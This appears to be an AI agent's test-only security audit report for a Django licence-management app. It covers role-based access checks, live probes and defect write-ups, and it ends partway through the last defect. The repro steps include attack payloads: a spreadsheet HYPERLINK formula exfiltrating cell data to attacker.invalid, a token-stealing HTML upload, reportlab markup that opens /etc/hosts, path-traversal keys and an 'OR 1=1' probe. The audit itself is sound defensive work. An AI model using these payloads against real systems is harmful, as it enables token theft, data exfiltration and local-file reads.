# Security

**SAT workstream:** sat-sec · **Date:** 2026-11-20 · **Branch:** `feature/v5` · **Working-tree fingerprint:** `git diff | shasum | cut -c1-12` = `6f1712e03000` (the tree is dirty: about 178 uncommitted paths belong to other sessions. This report covers the code as it stood in the tree at that moment.)
**Mode:** test and document only. No application code was changed. Nothing was committed or migrated, and nothing was written to `lmanagement@localhost`.

## Methodology

- **Orientation:** I mapped the codebase with the `.claude/index/` code index, `apps/accounts/permissions.py`, `lmanagement/settings.py`, `lmanagement/urls.py`, and the frontend guard files `frontend/src/routes/authorizationRoles.ts` and `AppRoutes.tsx`.
- **URL enumeration:** I walked the Django resolver programmatically (`~/lm_sat_evidence/sec/scripts/enum_urls.py` writes `urls.json`). It found 1254 patterns; 670 are under `/api/` and 381 remain after removing format-suffix duplicates.
- **Role × endpoint matrix** (`tests/test_sat_sec_matrix.py::test_matrix`):
  - I tested every API route and method against 21 principals: anon, superuser, a user with no groups, and one user per role (18 roles).
  - The check is introspective. It builds the real view with the router's `initkwargs`, sets `action`, runs `initialize_request` and `check_permissions`, and never executes the handler, so it has no side effects.
  - Result: 493 route-method combinations across 365 concrete paths, with 0 harness errors.
  - 10 routes whose URL kwargs only accept fixed values (for example `(?P<kind>boe|allotment)`, all in `ItemPivotViewSet`) could not be reversed, so I reviewed their code instead: each one calls `_can_approve` (LICENSE_MANAGER).
- **Live probes** (`tests/test_sat_sec_active.py`, 19 tests):
  - I sent real HTTP requests through `APIClient`, with users and data created in fixtures.
  - They ran against `TEST_DB_NAME=test_lmanagement_sat_sec`.
- **Isolation** (`tests/conftest.py`):
  - A socket guard allows only TCP 5432 on localhost, so Redis and outbound network calls are blocked.
  - The cache is LocMem, mail is LocMem, Celery runs eagerly with a memory broker, and `MEDIA_ROOT` is a pytest temp dir.
  - Throttling was disabled only for the injection sweep, and only after it had first been observed throttling the sweep (429s).
- **Command:**
  `cd backend && TEST_DB_NAME=test_lmanagement_sat_sec .venv/bin/python -m pytest ~/lm_sat_evidence/sec/tests -c pytest.ini --ds=lmanagement.settings --import-mode=importlib -p no:cacheprovider -q -o addopts="" --rootdir=. --reuse-db -p no:warnings -rA`
- **Final run:** `run_final.log` and `run_final.exit` show `exit=1`: 20 passed and 1 failed. The failure is `test_unauth_live`, whose strict "401 only" assertion counts 403 responses as failures. All 21 of those 403s are denials (see SAT-SEC-001). There are also targeted reruns: `run3_b03` exit 0, `run4_f01` exit 0, `run5_b04` exit 0.
- **Evidence:** everything is in `~/lm_sat_evidence/sec/`: `matrix.json`, `matrix_summary.txt`, `unauth_live*.json`, `active_evidence.json`, `run*.log`, `run*.exit`.
- **Secret handling:** I did not read secret values. Tracked environment files are reported by presence and size only; reading their contents was blocked by the safety hook and classifier.

## Role × endpoint matrix summary

The gate tested is the class-level permission gate (`check_permissions`), over 493 route-method combinations.

| Principal | Allowed | Allowed (non-GET) | Denied |
|---|---:|---:|---:|
| anon | 23 | 19 | 470 |
| superuser | 493 | 254 | 0 |
| no-group user | 95 | 34 | 398 |
| USER_MANAGER | 179 | 109 | 314 |
| LICENSE_MANAGER | 246 | 86 | 247 |
| LICENSE_VIEWER | 135 | 36 | 358 |
| ALLOTMENT_MANAGER / VIEWER | 159 / 108 | 47 / 37 | 334 / 385 |
| BOE_MANAGER / VIEWER | 178 / 122 | 50 / 35 | 315 / 371 |
| TRADE_MANAGER / VIEWER | 256 / 191 | 71 / 47 | 237 / 302 |
| INCENTIVE_LICENSE_MANAGER / VIEWER | 147 / 101 | 39 / 34 | 346 / 392 |
| REPORT_VIEWER | 139 | 34 | 354 |
| TL_GENERATE | 115 | 37 | 378 |
| LEDGER_MANAGER | 124 | 43 | 369 |
| ACCOUNT_ACCESS | 122 | 35 | 371 |
| ACCOUNTS_VIEWER / MANAGER / APPROVER | 126 / 136 / 163 | 34 / 44 / 71 | 367 / 357 / 330 |

How to read the counts:
- The anon "allowed" rows are login, refresh, password-reset (×2), health, the invoice-document capability URL, and 17 `ItemPivotViewSet` actions declared with `permission_classes=[]`. Those 17 enforce auth inside the handler, and the live probe returned 401 or 403 for all of them (SAT-SEC-015, D10).
- The 34 non-GET actions allowed to every authenticated user, including no-group users, are:
  - auth self-service: logout, change-password, `/me`
  - the owner-scoped TaskViewSet
  - the 15 handler-gated ItemPivot actions
  - `import-item-suggestion`
  - `/api/sync/*` (these use `PeerTokenAuthentication`, so a user JWT is rejected with 403 in the live run).

**Violations: backend permits more than the role semantics or the frontend guard**

| # | Endpoint (method) | Who is allowed | Intended (role semantics / FE guard) | Defect |
|---|---|---|---|---|
| 1 | `/api/license-ledger/download-package/{job}/purchase-trades/{trade}/upload/` (POST) | TRADE_VIEWER (and every LicenseLedgerViewPermission role) | Read-only role. The FE readiness/upload screen is gated to LEDGER_PACKAGE_READINESS_ROLES (LM, TM, LEDGER_MANAGER) | D01 |
| 2 | `/api/license-ledger/download-package/{job}/purchase-trades/{trade}/recover-orphan/` (POST) | TRADE_VIEWER | same as #1 | D02 |
| 3 | `/api/license-ledger/download-package/{job}/retry/`, `download-requests/{id}/retry/`, `/reconcile/` (POST) | TRADE_VIEWER | Owner-scoped job control; low impact | covered by D01 root cause |
| 4 | `/api/media/accounting/**`, `tl/**`, `exports/**`, `entity_*/**`, `avatars/**` (GET) | any authenticated user, including no-group | accounting roles / owning record's roles | D04 |
| 5 | `/api/licenses/**` (GET, plus read-only POSTs `bulk-balance-excel`, `import-item-names/preview`) | TRADE_VIEWER, TRADE_MANAGER | The FE `LICENSE_ROLES` = LM, LV only. The backend `LicensePermission.required_roles_for_read` includes TV and TM | Owner question Q1 (may be intentional) |
| 6 | `generate-transfer-letter` on allotments, BOEs, trades (POST) | ALLOTMENT_VIEWER, TRADE_VIEWER | `TransferLetterPermission` grants them explicitly; only BOE_VIEWER is excluded by documented decision | Owner question Q7 |
| 7 | `bill-of-entries/{id}/update-invoice-no/` (POST) | BOE_VIEWER | Documented owner decision D2: the one viewer write | none (by design) |

## Test-ID table

| ID | Area | Status | Evidence (all under `~/lm_sat_evidence/sec/`) |
|---|---|---|---|
| SAT-SEC-001 | Unauthenticated access, every API route and method (live) | PASS-EXC | `unauth_live.json`: 463× 401, 21× 403 (sync peer-auth ×6 and ItemPivot handler-gated ×15, both denials), 1× 400 (refresh with empty body), 8 AllowAny by design (login, refresh, reset ×2, health, invoice capability URL). 0× 2xx, 0× 5xx. `run_final.exit`=1 only because of the strict 401-only assertion |
| SAT-SEC-002 | JWT lifetime, rotation, blacklist settings | PASS | A01: access 30 min, refresh 7 d, ROTATE and BLACKLIST_AFTER_ROTATION both True. A02: reusing an old refresh token after rotation returns 401 |
| SAT-SEC-003 | Logout invalidation | PASS-EXC | A02: logout 205, then refresh returns 401. The access token is still valid (200 on `/me`) until it expires (D07) |
| SAT-SEC-004 | Session revocation on password change or reset | FAIL | A03: after a password change, the old refresh token still refreshes (200) and the old access token still works (200). D07 |
| SAT-SEC-005 | Password validators | PASS | A03: weak password returns 400. B02: user-create with "123" returns 400. Reset-confirm calls `validate_password` (code: `password.py:115`) |
| SAT-SEC-006 | API login brute-force throttle | PASS-EXC | A04: 401 ×10, then 429. A request with a spoofed `X-Forwarded-For` after lockout got 401, meaning it was not throttled, because `NUM_PROXIES=1` makes the throttle key the last XFF entry. This is safe behind the tracked nginx (`$proxy_add_x_forwarded_for`), and exploitable only if gunicorn is reachable directly |
| SAT-SEC-007 | Django admin login brute force | FAIL | A04: 15 failed `/admin/login/` POSTs all returned 200, none 429. D08 |
| SAT-SEC-008 | Password-reset user enumeration | PASS | A05: identical 200 body for known and unknown identifiers |
| SAT-SEC-009 | Query-string JWT scope | PASS-EXC | A06: `?access_token=` on `/api/licenses/` returns 401. On `/api/allotments/export/` GET it returns 200, and POST returns 401. Still accepted for download URLs (D13) |
| SAT-SEC-010 | Role × endpoint matrix (21 principals × 493 combinations) | FAIL | `matrix.json`, `matrix_summary.txt`, `run_final.log` (`test_matrix` PASSED, 0 harness errors). Violations #1–#4 above |
| SAT-SEC-011 | Viewer write probes (live) | FAIL | B03: TRADE_VIEWER replaced a purchase-trade invoice document twice (200/200). B04: TRADE_VIEWER copied an accounting voucher onto a trade (200). Other viewer writes are denied: LV POST/DELETE licence 403, TV POST/PATCH trade 403 |
| SAT-SEC-012 | Accounting write levels (manager vs approver) | PASS | Matrix plus B01: ACCOUNTS_MANAGER gets 403 on voucher post, invoice post and period lock. `InvoiceActionView.initial` raises `post/reverse/resync` to approve level |
| SAT-SEC-013 | User-management escalation | PASS | B02: a USER_MANAGER create with `is_superuser`/`is_staff`=true is silently ignored (both False). PATCH and reset-password on a superuser return 403. No password hash in the listing. (Self-grant of ACCOUNTS_APPROVER is allowed: Q3) |
| SAT-SEC-014 | `/me` self-escalation | PASS-EXC | B02: PATCH `is_superuser`/`is_staff`/`roles` is ignored. A user can rename their own `username` (D16) |
| SAT-SEC-015 | ItemPivot actions with `permission_classes=[]` (23 actions) | PASS-EXC | B01: anon, no-group and LICENSE_VIEWER all get 403 on train, consolidation/apply, aliases and decide. The gate exists only inside the handler (D10). The 10 enum-kwarg routes were code-reviewed |
| SAT-SEC-016 | Frontend guard vs backend | PASS-EXC | The backend is weaker than the frontend only for D01/D02 (FE upload screen roles LM/TM/LEDGER_MANAGER vs backend all ledger read roles) and licence read for TV/TM (Q1). No frontend-only write gate found otherwise |
| SAT-SEC-017 | IDOR: tasks | PASS | C01: another user's task returns 404 on GET, PATCH and DELETE, and is absent from their list |
| SAT-SEC-018 | IDOR: ledger packages and download requests | PASS | C02: owner 200; another LICENSE_MANAGER gets 404 on GET and retry |
| SAT-SEC-019 | Media download authorization and path traversal | FAIL | C01: no-group user gets 200 on `accounting/vouchers/...pdf`, `accounting/loans/...pdf`, `tl/...docx`, `exports/...xlsx`. An orphan file under `licenses/` gives 404 and anon gets 401. `../` and `%2e%2e` traversal give 404. D04 |
| SAT-SEC-020 | Invoice-document capability URL | PASS | C01: random token returns 404. Code (`views_invoice_documents.py:43-109`): hashed token, expiry, max-views with an atomic claim, identity binding, company/version re-check, audit |
| SAT-SEC-021 | Accounting EntityBooks per-user scoping | NOT-RUN | No user-to-entity scoping exists in code (`grep` of `apps/accounting`, `accounts/models.py`), so there is nothing to probe. Q4 |
| SAT-SEC-022 | CSRF with session authentication | PASS | D01: `SessionAuthentication` is enabled (`settings.py:287`). A session PATCH without a CSRF token returns 403. Bearer plus session cookie returns 200 (`DisableCSRFForAPIMiddleware` only applies with a Bearer token) |
| SAT-SEC-023 | CORS | PASS-EXC | D01: `Origin: https://evil.example` gets no `Access-Control-Allow-Origin`. In non-production mode, any `http://localhost:<port>` is allowed with credentials (D15) |
| SAT-SEC-024 | Frontend XSS sinks | PASS | No `dangerouslySetInnerHTML`, `innerHTML=`, `eval(` or `new Function(` in `frontend/src` (non-test) |
| SAT-SEC-025 | Stored XSS through uploaded documents | FAIL | E02: LICENSE_MANAGER uploaded `copy.html`, and LICENSE_VIEWER received 200 `text/html`, `inline`, with no CSP. `.svg` and a 3 MB `.exe` were accepted (201). D03 |
| SAT-SEC-026 | Spreadsheet formula injection | FAIL | E01: port name `=HYPERLINK(...)` was exported to `ports/export?_export=xlsx` cell B2 with `data_type='f'` (a live formula). D05 |
| SAT-SEC-027 | PDF markup injection | FAIL | E03: company name `ACME <b>Pvt` raises ValueError and the PDF fails. `<img src="/etc/hosts">` made reportlab open the local file `/etc/hosts`. D06 |
| SAT-SEC-028 | Raw SQL review | PASS | All request-reachable raw SQL is parameterised. Ordering is whitelisted (`license_overview_transactions.py:715-717`, `:648`). `materialized_views.py` uses constant view names. The other `cursor.execute` calls are in management commands |
| SAT-SEC-029 | SQL-injection probes (116 list endpoints × 4 payloads: `ordering`, `search`, `id`, `license_number`) | PASS-EXC | `run4_f01.log` exit 0: 343× 200, 100× 400, 21× 500. No SQL error or behaviour change. The 500s are all a non-integer `id` raising ValueError (D09) |
| SAT-SEC-030 | File-upload validation | FAIL | BOE PDFs: size limit plus signature check (`boe_documents.py:205-221`). Ledger upload: extension plus 50 MB. Bank statements: size cap. Licence documents: no type or size check (D03). Licence parse-pdf: no size limit. A corrupt PNG on the package upload returns 500 (B03, D09) |
| SAT-SEC-031 | Serializer data exposure | PASS | Login, `/me` and `/users` contain no password hash (A02, B02). The `UserSerializer` privilege fields are read-only. Company sensitive-field narrowing (SEC-02) was code-reviewed only (`permissions.py:251-257`) |
| SAT-SEC-032 | DEBUG and error leakage | PASS-EXC | H01: DEBUG False; `/api/<unknown>` returns JSON 404. Several views return `str(e)` in 400/500 bodies (D11) |
| SAT-SEC-033 | Secrets in settings defaults | PASS-EXC | The repo fallback `SECRET_KEY` (`settings.py:40`) is rejected only when `DJANGO_ENVIRONMENT=production` (`settings.py:80-116`). The DB and Redis credential defaults are the same. D15 |
| SAT-SEC-034 | Environment files tracked by git | FAIL | `git ls-files`: `.env` (0 B), `backend/.env_dgft` (474 B, 1 commit), `frontend/.env` (35 B), `frontend/.env.production` (233 B). Contents were not inspected (policy). D14 |
| SAT-SEC-035 | Token storage (localStorage) | PASS-EXC | `access`, `refresh` and `user` are kept in localStorage (`AuthContext.tsx:218-220`, `axios.js:30-138`). This is by design, but any XSS (D03) leads to account takeover, and no CSP header is sent (nginx `add_header` set, `nginx-license-manager.conf:113-117`) |
| SAT-SEC-036 | Refresh flow | PASS | Rotation plus blacklist (A02). The frontend uses one queued refresh (`axios.js:126-138`) |
| SAT-SEC-037 | Audit log coverage | PASS-EXC | J01: the middleware logged UPDATE `/me`, VIEW licences and CREATE licences (400) with method and status. A failed login is not logged. Logging is async and best-effort (`middleware.py:99-135`). D12 |
| SAT-SEC-038 | Audit log tamper resistance | PASS-EXC | J01: the API is read-only (DELETE and PUT return 405, USER_MANAGER only). In Django admin, a superuser has change and delete permission on ActivityLog (D12) |
| SAT-SEC-039 | pip-audit | NOT-RUN | pip-audit is not installed in `backend/.venv` or on PATH, and installing it is forbidden |
| SAT-SEC-040 | npm audit | NOT-RUN | npm is present, but `npm audit` needs registry network access, and outbound network is forbidden |

**Status counts (40 IDs):** PASS 13 · PASS-EXC 14 · FAIL 10 (004, 007, 010, 011, 019, 025, 026, 027, 030, 034) · BLOCKED 0 · NOT-RUN 3 (021, 039, 040).

## Defects

### SAT-SEC-D01 — High — Read-only TRADE_VIEWER can replace supplier purchase-invoice documents
- **Category:** Broken access control (vertical) and integrity
- **Module:** `license` (ledger package)
- **Why High:** A read-only role can change the financial evidence that goes into licence ledger packages.
- **Repro (B03):**
  1. As TRADE_VIEWER: `POST /api/license-ledger/download-package/ {"license_ids":[<any licence>]}` returns 202.
  2. `POST /api/license-ledger/download-package/<job.key>/purchase-trades/<purchase trade on that licence>/upload/` with a PNG returns 200 `{"status":"uploaded"}`.
  3. Repeating the upload with another file returns 200 again and overwrites the document (`uploaded-2-de33…-evil.png` became `uploaded-2-2ba1…-evil2.png`).
- **Expected:** 403 for read-only roles (the frontend exposes the readiness/upload UI only to LM, TM and LEDGER_MANAGER).
- **Actual:** 200. TRADE_VIEWER itself cannot PATCH the trade (403), so this bypasses the trade write gate.
- **Evidence:** `active_evidence.json` → `B03_viewer_doc_write`; `run_final.log` PASSED.
- **Root cause:**
  - `backend/apps/accounts/permissions.py:140-156`: `LicenseLedgerViewPermission` ignores the HTTP method, so every action on `LicenseLedgerViewSet` counts as "read".
  - `backend/apps/license/api/views/ledger.py:322-340`: the upload action has no write-role check.
  - `backend/apps/license/services/ledger_package_recovery.py:140-152` overwrites an existing `purchase_invoice_copy` without checking whether one is already there.
- **Impact:** Any ledger viewer can substitute the supplier invoice evidence included in licence ledger packages sent to third parties. The change is audit-logged (`LicenseLedgerRecoveryAudit`), but nothing prevents it.
- **Remediation:** Gate upload, recover-orphan, retry and reconcile behind a write role (for example `LedgerUploadPermission`, or a TM/LEDGER_MANAGER role set) through `get_permissions` per action. Refuse to overwrite an existing document unless a manager confirms.
- **Business approval:** Y. The owner decides which roles may supply package evidence (Q2). This is a PERMISSION CHANGE.

### SAT-SEC-D02 — High — recover-orphan copies an arbitrary storage object (for example an accounting voucher) onto a trade
- **Category:** Broken access control, insecure direct object reference on storage keys, confidentiality bypass
- **Module:** `license` (ledger package)
- **Why High:** A read-only role can pull confidential documents from other modules into a module it can read.
- **Repro (B04):**
  1. TRADE_VIEWER creates a package job for a licence that has a purchase trade without a document.
  2. `POST .../purchase-trades/<id>/recover-orphan/ {"source_storage_key":"accounting/vouchers/2026/11/secret-voucher.pdf","evidence":{invoice_number,supplier_id,invoice_date,total_amount}}` returns 200 `{"status":"recovered"}`.
  3. The trade's document becomes `trade/purchase_invoices/recovered-3-…`, which trade roles can download through `/api/media/` because `media.py` maps it to `TradePermission`.
- **Path traversal:** `"../../etc/hosts"` returns 400 (`SuspiciousFileOperation`), so the reach is confined to MEDIA_ROOT.
- **Expected:** The key must come from a server-computed orphan-candidate list, and the action needs a write role.
- **Actual:** Any client-supplied key inside MEDIA_ROOT that holds a valid PDF or image is accepted. The evidence fields are the trade's own, which the caller can already read.
- **Evidence:** `B04_recover_orphan`; `run5_b04.exit`=0 and `run_final.log` PASSED.
- **Root cause:** `backend/apps/license/api/views/ledger.py:342-363` (`source_storage_key` comes from `request.data`) and `ledger_package_recovery.py:106-136` (does not check that `source_key` is one of the orphan candidates).
- **Impact:** A TRADE_VIEWER can read documents from other areas (accounting vouchers, loan agreements, BOE copies, other trades' invoices) and attach them to a trade.
- **Remediation:** Accept only an opaque candidate id that the server resolves against the orphan-scan results. Never accept a raw storage key. Require a write role (as in D01).
- **Business approval:** N for the key validation. Y for the role gate (Q2).

### SAT-SEC-D03 — High — Stored XSS through licence document upload (HTML/SVG served inline on the app origin)
- **Category:** Stored XSS and unrestricted file upload
- **Module:** `license` documents and `core` media
- **Why High:** It allows escalation from LICENSE_MANAGER to superuser, because tokens live in localStorage on the same origin.
- **Repro (E02):**
  1. As LICENSE_MANAGER: `POST /api/licenses/<id>/documents/` with `file=copy.html` (containing `<script>…localStorage.access…</script>`) and `type=OTHER` returns 201, stored as `licenses/<no>/<no>_Other.html`.
  2. As LICENSE_VIEWER: `GET /api/media/licenses/<no>/<no>_Other.html` returns 200 with `Content-Type: text/html` and `Content-Disposition: inline`, and no CSP.
  3. `.svg` with `onload` returns 201, and a 3 MB `.exe` returns 201.
- **Expected:** Only allow-listed document types (PDF or images by signature) with a size cap. Anything else is served as an `attachment` with `application/octet-stream`.
- **Actual:** Any type and any size is accepted, and it is rendered inline on the SPA origin.
- **Evidence:** `E02_stored_html`.
- **Root cause:** `backend/apps/license/api/views/license.py:1196-1245` has no validation. `backend/apps/core/views/media.py:194-197` serves non-BOE files with `FileResponse(..., as_attachment=False)`, so the content type is guessed from the extension. The production X-Accel branch (`media.py:183-190`) also sends `inline`. No CSP is sent anywhere.
- **Impact:** A LICENSE_MANAGER, or anyone holding that token, can plant script that runs when a superuser or USER_MANAGER opens the document. It steals the `access`/`refresh` tokens.
- **Remediation:**
  - Reuse the `validate_boe_pdf` / `validate_source_bytes` pattern for licence documents (allow-list plus size).
  - In `ProtectedMediaView`, force `attachment` and `application/octet-stream` unless the bytes are PDF or a raster image (as the BOE branch already does).
  - Add a restrictive `Content-Security-Policy`.
- **Business approval:** N.

### SAT-SEC-D04 — Medium — Media files outside the five mapped prefixes are readable by any authenticated user
- **Category:** Broken access control / IDOR
- **Module:** `core` media
- **Why Medium:** It needs an authenticated account and guessable paths. The paths contain year, month and the original filename.
- **Repro (C01):** A user with no groups GETs `/api/media/accounting/vouchers/2026/11/v1.pdf`, `/api/media/accounting/loans/agreement.pdf`, `/api/media/tl/template.docx` and `/api/media/exports/report.xlsx`, and gets 200 for each.
- **Expected:** Accounting attachments require `ACCOUNTS_*`. Transfer-letter templates and exports require their owning roles.
- **Actual:** Anyone authenticated can read them.
- **Evidence:** `C01_idor`.
- **Root cause:** `backend/apps/core/views/media.py:41-108`: `_required_read_roles` returns `None` ("any authenticated user") for every prefix other than `licenses/`, `boe_copies/`, `trade/`, `license_purchases/` and `companies/`. The upload paths that fall through to this are `accounting/suspense|loans|invoices|vouchers` (`apps/accounting/models/*.py`), `tl`, `entity_logos/`, `entity_signature/`, `entity_stamp/`, `avatars/` and `exports/`.
- **Impact:** Any account, including a freshly created one with no groups, can download financial attachments.
- **Remediation:** Make the mapping deny-by-default: unknown prefix means superuser only. Add an `accounting/` mapping to `ACCOUNTS_READ_ROLES` with an owning-row check.
- **Business approval:** N.

### SAT-SEC-D05 — Medium — Spreadsheet formula injection in XLSX and CSV exports
- **Category:** Injection (CSV/XLSX formula)
- **Module:** `core` exporters (shared), master export
- **Why Medium:** Any user who can write text fields can trigger it, but a victim has to open the export.
- **Repro (E01):** Create a port with name `=HYPERLINK("http://attacker.invalid/?x="&A1,"click")`, then `GET /api/masters/ports/export/?_export=xlsx`. Cell B2 is stored as a formula (`data_type 'f'`).
- **Expected:** Text cells that start with `= + - @` (or tab/CR) are written as text.
- **Actual:** The text is written as a live formula.
- **Evidence:** `E01_formula`.
- **Root cause:** There is no sanitiser in `backend/apps/core/exporters/excel/*` or `backend/apps/core/views/master_view.py:795-…` (`_export_xlsx`). openpyxl stores any string starting with `=` as a formula. CSV exports (`ledger.py:309-320`, `trade/api/views.py:286-293`) are also unsanitised.
- **Impact:** User-entered text (names, remarks, product names) runs as formulas or exfiltration links in a colleague's spreadsheet.
- **Remediation:** Add one cell sanitiser in the shared excel builder and the master export, for user-text values only. Programmatic `=SUM` formulas stay unaffected.
- **Business approval:** N. Exported values change cosmetically, so this is an EXPORT CONTRACT note.

### SAT-SEC-D06 — Medium — Allotment PDF interpolates user text into reportlab markup without escaping
- **Category:** Markup injection, local-file/SSRF probe, PDF denial of service
- **Module:** `allotment`
- **Why Medium:** Normal data (a `<` in a name) breaks the document, and crafted data makes the server open arbitrary paths or URLs.
- **Repro (E03):** `generate_allotment_pdf_bytes` with company name `ACME <b>Pvt` raises `ValueError` (parse error), so the PDF is not produced. With `ACME <img src="/etc/hosts" …/>`, reportlab opens `/etc/hosts` as an image (`UnidentifiedImageError … fileName='/etc/hosts'`).
- **Expected:** User text is escaped, as `trade/bill_of_supply_pdf.py:210` already does with `escape`.
- **Actual:** The text is parsed as markup.
- **Evidence:** `E03_pdf_markup`.
- **Root cause:** `backend/apps/allotment/scripts/allotment_pdf.py:41-58`: `company_name`, `company_address`, `item_name` and `invoice` go unescaped into `Paragraph`. 15 modules use `Paragraph` and only 4 import `escape`; the other 14 were not probed.
- **Impact:** Allotment PDF and transfer-letter ZIP fail for some names. With `<img src="http://…">` the server fetches arbitrary URLs.
- **Remediation:** Escape every interpolated user value in `Paragraph` markup, and audit the other PDF modules.
- **Business approval:** N.

### SAT-SEC-D07 — Medium — Password change or reset does not revoke existing tokens; logout leaves the access token valid
- **Category:** Authentication / session management
- **Module:** `accounts`
- **Why Medium:** A victim cannot cut off an attacker who already holds a refresh token.
- **Repro (A02, A03):**
  - After `POST /api/auth/change-password/` returns 200, the refresh token issued before the change still refreshes (200) and the old access token still works (200).
  - After logout (205), the access token still returns 200 on `/me`.
- **Expected:** A password change or reset blacklists the user's outstanding refresh tokens. Logout deny-lists the access `jti`.
- **Actual:** A stolen refresh token survives a password change for up to 7 days, with rotation extending it.
- **Evidence:** `A02_session`, `A03_pwchange`.
- **Root cause:** `backend/apps/accounts/views/password.py:105-109` and `:144-150`; `backend/apps/accounts/views/user_management.py:81-93` (admin reset). `backend/apps/accounts/views/auth.py:39-55` does not use the existing `RevokedAccessToken` deny-list (`apps/core/authentication.py:65-74`).
- **Impact:** Account takeover persists after the victim changes or resets the password.
- **Remediation:** Blacklist all `OutstandingToken`s for the user on a password change, reset or admin reset. On logout, also record the access `jti` in `RevokedAccessToken`.
- **Business approval:** N.

### SAT-SEC-D08 — Medium — `/admin/login/` has no brute-force throttle
- **Category:** Authentication (brute force)
- **Module:** Django admin
- **Why Medium:** It targets only staff and superuser accounts, which are the highest-value accounts.
- **Repro (A04):** 15 failed POSTs to `/admin/login/` for a staff superuser all return 200, with no 429. The API login throttles at the 11th attempt.
- **Expected:** The same limit (10/min), or a lockout.
- **Actual:** No limit. nginx also has no `limit_req` on `location /admin/` (`nginx-license-manager.conf:84-88`).
- **Evidence:** `A04_bruteforce.admin_login_codes`.
- **Root cause:** `LoginRateThrottle` applies only to DRF `LoginView` (`apps/accounts/views/auth.py:15-18`). `lmanagement/urls.py:31` exposes `admin/` with no rate limit.
- **Impact:** Unthrottled online password guessing against superusers.
- **Remediation:** Add an nginx `limit_req` (or an IP allow-list) on `/admin/`, or apply a throttle or lockout to the admin login.
- **Business approval:** N. Deploy configuration needs owner approval to apply.

### SAT-SEC-D09 — Low — Unvalidated input causes HTTP 500 (`id` filter on 21 list endpoints; corrupt image upload)
- **Category:** Input validation / error handling. This is not SQL injection: the ORM parameterises the query.
- **Why Low:** No data exposure (DEBUG False), only availability noise.
- **Repro:**
  - `GET /api/licenses/?id=1 OR 1=1` returns 500. The same happens on `/api/allotments/`, `/api/bill-of-entries/`, `/api/trades/`, `/api/payments/`, `/api/lines/`, `/api/incentive-licenses/` and 14 `/api/masters/*` lists.
  - A corrupt PNG on the package upload returns 500.
- **Expected:** 400.
- **Evidence:** `run4_f01.log` (exit 0; 21 failures listed in `F01_sqli`); `B03_viewer_doc_write.broken_png_upload`=500.
- **Root cause:** `backend/apps/core/views/master_view.py:577` (`apply_advanced_filters`, called from `get_queryset` at `:339`) casts `id` without validation. `ledger_package_recovery.py:33-35` raises PIL `SyntaxError`, but `ledger.py:338` catches only `ValueError`.
- **Remediation:** Validate numeric filters and return 400. Map image-decode errors to `ValidationError`.
- **Business approval:** N.

### SAT-SEC-D10 — Low — 23 ItemPivot actions bypass the class permission (`permission_classes=[]`) and rely on checks inside the handler
- **Category:** Defence in depth (RBAC)
- **Module:** `license` item pivot
- **Why Low:** Every action checked is currently gated in its handler (live 401/403).
- **Repro:** The matrix shows anon as "ALLOW" at the class gate. The live probe (B01) returns 401 or 403 from the handler.
- **Root cause:** `backend/apps/license/api/views/item_pivot_intelligence.py:126, 148, 194, 254, 317, 336, 373, 413, 451, 480, 503, 527, 553, 600, 624, 639, 675, 749, 763, 779, 791, 817`.
- **Impact:** Unauthenticated requests reach handler code. A future action that forgets `_can_approve` would be fully open.
- **Remediation:** Use a declarative per-action permission (for example a `LicenseManagerPermission`) instead of `[]`.
- **Business approval:** N.

### SAT-SEC-D11 — Low — Exception text returned to clients
- **Category:** Information disclosure
- **Why Low:** Only error details leak; no data is exposed.
- **Root cause:** `str(e)` appears in 500 or 400 bodies at:
  - `apps/license/api/views/active_licenses_report.py:61`
  - `item_pivot_report.py:113, 135, 186`
  - `item_report_products.py:49, 66`
  - `inventory_balance_viewset.py:100, 131`
  - `ledger_upload.py:163, 229`
  - `apps/license/views_actions.py:495`
  - `parse_pdf.py:194`
- **Evidence:** code review (grep).
- **Remediation:** Use the existing `api_error()` helper (`apps/core/utils/exceptions.py:12`).
- **Business approval:** N.

### SAT-SEC-D12 — Low — Audit-log gaps and superuser-mutable logs
- **Category:** Logging and monitoring
- **Why Low:** It needs a superuser to tamper, and it does not affect data.
- **Repro (J01):**
  - A failed login creates no ActivityLog row.
  - `admin.site` registers ActivityLog with change and delete permission for a superuser.
  - Writes run in a daemon thread, and failures are swallowed (`apps/core/middleware.py:99-135`).
  - A request that failed validation is labelled `CREATE` with status 400.
- **Expected:** Failed logins are logged. Logs are append-only in admin.
- **Remediation:** Log failed logins in `LoginView`. In the ActivityLog admin, make `has_change_permission` and `has_delete_permission` return False.
- **Business approval:** N.

### SAT-SEC-D13 — Low — JWT accepted in the query string on download and export URLs
- **Why Low:** Limited to GET/HEAD on download-like paths, and the frontend no longer uses it.
- **Root cause:** `backend/apps/core/authentication.py:12-63`.
- **Repro:** A06: `/api/allotments/export/?access_token=…` returns 200.
- **Impact:** Bearer tokens end up in proxy access logs, browser history and Referer headers.
- **Remediation:** Remove the fallback, or switch to short-lived signed download URLs.
- **Business approval:** N.

### SAT-SEC-D14 — Medium (pending confirmation) — Environment files are tracked in git
- **Category:** Secrets management
- **Why Medium:** The file named for the DGFT session and CSRF values is in git history. Severity becomes High if it holds real values, and Low if it holds only placeholders.
- **Evidence:** `git ls-files` lists `backend/.env_dgft` (474 B, in history), `frontend/.env.production` (233 B), `frontend/.env` (35 B) and `.env` (0 B). Per `settings.py:49-60`, `backend/.env_dgft` is the documented source of `DGFT_SESSION_ID`, `DGFT_CSRF_TOKEN`, `DGFT_IEC_NUMBER`, `DGFT_APP_ID` and `DGFT_AWSALB`.
- **Not inspected:** I did not read the contents (policy).
- **Remediation:** The owner should check the file. Rotate any real values, untrack the files (`git rm --cached`), add them to `.gitignore`, and keep only `*.example`.
- **Business approval:** Y.

### SAT-SEC-D15 — Low — Production hardening is opt-in (fails open when `DJANGO_ENVIRONMENT` is unset)
- **Why Low:** It needs a misconfigured deploy, but the impact if that happens is severe.
- **Root cause:** `backend/lmanagement/settings.py:46-47` and `:80-116`. The repo-default `SECRET_KEY` (`:40`), insecure cookies and HSTS 0 are rejected only when `DJANGO_ENVIRONMENT` is `production`/`prod`. Otherwise CORS allows any `http://localhost:<port>` with credentials (`:465-469`).
- **Evidence:** H01: `deployment_env=development`, `secret_key_is_repo_default=True`.
- **Impact:** A deployment that forgets the variable boots with a public signing key. Anyone could then forge sessions, password-reset tokens and JWTs.
- **Remediation:** Fail closed whenever `DEBUG` is False and the key is the default.
- **Business approval:** N.

### SAT-SEC-D16 — Low — Users can rename themselves; any authenticated user can enumerate users and the API schema
- **Why Low:** It aids reconnaissance and blurs audit attribution, but grants no privilege.
- **Repro:**
  - B02: PATCH `/api/auth/me/ {"username": "..."}` returns 200, and the username changes.
